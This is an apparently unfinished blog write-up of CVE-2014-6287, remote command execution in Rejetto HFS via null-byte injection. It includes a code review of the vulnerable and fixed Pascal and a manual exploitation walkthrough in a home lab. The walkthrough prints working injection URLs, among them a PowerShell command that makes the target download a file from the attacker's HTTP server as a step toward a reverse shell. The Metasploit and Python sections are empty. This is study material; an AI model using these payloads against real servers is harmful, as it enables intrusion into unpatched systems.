---
layout: post
title:  "Rejetto HFS Remote Command Execution CVE2014-6287"
categories: [Vulnerabilities]
tags: [command execution, exploit, python]
draft: true
---

### Introduction

On September 12th 2014, a vulnerability found within HttpFileServer was reported that allowed attackers to remotely execute commands on the affected device, this was caused due to poor validation on user input, which would allow an attacker to execute arbitary commands. The bug was reported in the `findMacroMarker()` function in the `parserLib.pas` file.

### So, How does it work?

By performing whats known as [NullByte Injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection) we can bypass the sanity checking written in that function thus allowing us to script over HFS without any restrictions in place. This is because the RegEx does not correctly handle the nullbyte characters which is what allows us to escape the filter. If you want to know more about Null Byte Injection you can also read my [blog post](https://linxz.co.uk/attacks/2018/11/20/NullByte-Injection.html) on it.

If we send a nullbyte as a paramter when performing a search on the affected device then we can escape the filter of forbidden characters thus allowing us to execute arbitary commands on the device. As an example, take this request here `http://localhost:80/search=%00{.exec|+C:\Windows\system32\ping.exe+10.10.14.11}` as you can see we've got our nullbyte which allows us to bypass the sanity checking, then we're sending a command to tell the machine to run `ping.exe` and ping that IP address. You can learn more about [HFS Scripting Here.](http://www.rejetto.com/wiki/index.php/HFS:_scripting_commands). Now that we know we can execute commands remotely, we can now leverage this in order to setup a reverse shell to the affected device thus giving us access to it with the same privilege level as the account the software is running on.

### Code Review

There's not a massive amount of code for us to review here however, because HFS is an open-source program we can look at both the affected & fixed code, which is nice! So, let's first look at the vulnerable function within `parserLib.pas`.

```Pascal
function findMacroMarker(s:string; ofs:integer=1):integer;
begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
```

As you can see, the vulnerable code is incredibly small, the only issue is that it does not correctly handle the nullbyte we send and thus that gives us the ability to script over HFS with no limitations. If we look in the `scriptLib.pas` file we can see where this function is called.

```Pascal
function noMacrosAllowed(s:string):string;
// prevent hack attempts
var
  i: integer;
begin
i:=1;
  repeat
  i:=findMacroMarker(s, i);
  if i = 0 then break;
  replace(s, '&#'+intToStr(charToUnicode(s[i]))+';', i,i);
  until false;
result:=s;
end; // noMacrosAllowed
```

As you can see, the function in which this function is called is actually meant to stop people passing macros into a URL. However, there is no handling for a null byte which as we mentioned, that's where the problem lies. In order to fix this issue a function called `enforceNUL(s)` was added.

```Pascal
function noMacrosAllowed(s:string):string;
// prevent hack attempts
var
  i: integer;
begin
i:=1;
enforceNUL(s);
  repeat
  i:=findMacroMarker(s, i);
  if i = 0 then break;
  replace(s, '&#'+intToStr(charToUnicode(s[i]))+';', i,i);
  until false;
result:=s;
end; // noMacrosAllowed
```

As you can see, before it executes `findMacroMarker` it will first run this `enforceNUL` function, let's take a look at what this function does, which is defined in `utillib.pas`.

```Pascal
procedure enforceNUL(var s:string);
begin
if s>'' then
  setLength(s, strLen(@s[1]))
end; // enforceNUL
```

Now, my Pascal knowledge isn't the best however as far as I can tell this function basically removes the first character so that you cannot inject a `%00` into the URL, I could be wrong so if anyone knows some Pascal and would like to help me understand this better please feel free to contact me on Twitter @LinxzSec or @Linxz on Discord, thanks! You can obtain all of the source code for HFS from Source Forge.

### Exploit

Usually I test things against Metasploitable 2 however this vulnerability is not present in MS2 and thus in the below examples I am testing it against my own machine. I'm running HFS 2.3b on my Windows box whilst exploiting it using my Kali VM. I will show you how to execute this exploit both manaully and with Metasploit.

Firstly, let's test that we're running an affected version (although in this case we know we are) we will start out with sending a simple ping in a command back to our device whilst simultaneously running TCPDump on our attacking machine. Start by running HFS on your machine, make sure you can connect to it via the browser.

![Connection](LinxzFade.github.io/assets/images/2018-11-20/2018-11-20.PNG)

Now that we can see our device as being up we can move into the actual exploitation of the device, we will first look at exploiting this manually.

#### Manual Exploitation

Before we begin to exploit this we're going to make sure that our device is running the vulnerable version, even though we know it is and we can confirm with `nmap ip -sV` we're just going to do a quick test, we will first try to get the device to execute a ping back to our attacking machine.

First, setup a tcpdump using `tcpdump -i eth0 ICMP` leave that running and capturing packets in a terminal, then browse to your webserver with the following URL `http://192.168.139.1/?search=%00{.exec|C:\Windows\System32\ping.exe+192.168.139.138.}` obviously you will need to replace the IP addresses else this won't work, when you run this what you should see is your tcpdump picking up packets, you will also see a terminal open on the Windows device if you're using it (for example in my case I have three screens and I can see the terminal open when I press enter in my Kali VM). Now, what we did here was verify that the version is affected by sending a payload to the device, in this case we just told it to execute ping.exe and then ping the ip address `192.168.139.138` which is the address of my Kali VM. It's worth noting that it seems you *must* use a full stop at the end of your command else the server will not execute it, at least that's in my experience.

```bash
root@LinxzSecKali:~# tcpdump -i eth0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
12:11:59.722051 IP 192.168.139.1 > LinxzSecKali: ICMP echo request, id 1, seq 33, length 40
12:11:59.722080 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 33, length 40
12:11:59.727859 IP 192.168.139.1 > LinxzSecKali: ICMP echo request, id 1, seq 34, length 40
12:11:59.727886 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 34, length 40
12:11:59.731815 IP 192.168.139.1 > LinxzSecKali: ICMP echo request, id 1, seq 35, length 40
12:11:59.731918 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 35, length 40
```

Next we need to exploit this vulnerability in order to get a reverse shell, we know the RCE is there so let's figure out how we can leverage that to get full access to the account that's running the service. So, as we've entioned the next step was to get a reverse shell! I came across the [following repo](https://github.com/samratashok/nishang) made by Samratashok which contains a lot of different PowerShell tools for offensive pen-testing. We're going to use some of these tools as there is one in here that will allow us to create a reverse shell on the target device, this is helpful because it means we don't have to build a script ourselves. (Yes I realise this section is "manual exploitation" however I think using a script here is much more efficient.)

So, we have the script, now we need to figure out how we can serve it to the target device so that we can send a payload to execute it. Well, we can use a variety of methods, in this case I'm going to use [SimpleHTTPServer.py](https://github.com/LinxzFade/Python-Hacking-Tools/blob/master/SimpleHTTPServer/SimpleHTTPServer.py) to achieve this. Basically, the script above is going to setup a HTTP Server on the specified port, and give any machine access to the directory that it's running in on that port, see where I'm going with this? Firstly, let's test our victim machine can access our attacking machine while we run `SimpleHTTPServer.py` in order to do this I am going to send the following PowerShell command to the device via my browser.

```PowerShell
http://192.168.139.1/?search=%00{.exec|+C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe%20-NoProfile%20-ExecutionPolicy%20unrestricted%20-Command%20(new-object%20System.Net.WebClient).Downloadfile(%27http://192.168.139.138:8000/test%27,%20%27C:\windows\temp\test%27).}
```

At the same time `SimpleHTTPServer.py` is going to be running in my terminal, as you can see I'm connecting to 192.168.139.138 on port 8000 which is my Kali machine & the port I've configured the HTTP Server to be running on, in the PS command above I am trying to donwnload "test" however that file does not exist and thus I get the below response from `SimpleHTTPServer.py`

```Bash
root@LinxzSecKali:~/Documents/Scripts/Python# python3 SimpleHTTPServer.py 8000
[+] Simple HTTP Server!
[+] Running Server...
192.168.139.1 - - [27/Nov/2018 18:39:04] code 404, message File not found
192.168.139.1 - - [27/Nov/2018 18:39:04] "GET /test HTTP/1.1" 404 -
192.168.139.1 - - [27/Nov/2018 18:39:04] code 404, message File not found
192.168.139.1 - - [27/Nov/2018 18:39:04] "GET /test HTTP/1.1" 404 -
```

but, that doesn't matter! We expected that behaviour and now we know that our python HTTP server is working, we can now use this to get the victim to download our PowerShell reverse shell script that we briefly mentioned earlier

#### Metasploit Exploitation

### Python Exploitation

### References

[SecLists Bug Tracker](https://seclists.org/bugtraq/2014/Sep/85)

[HFS Scripting](http://www.rejetto.com/wiki/index.php/HFS:_scripting_commands)

[NullByte Injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection)

[HFS Patchnotes](http://www.rejetto.com/hfs/?f=wn)

[HFS 2.3C](https://sourceforge.net/projects/hfs/files/HFS/2.3c/)

[Exploit DB](https://www.exploit-db.com/exploits/34668/)

[Rapid7 Module](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)

[Metasploit Module](https://www.exploit-db.com/exploits/34926/)
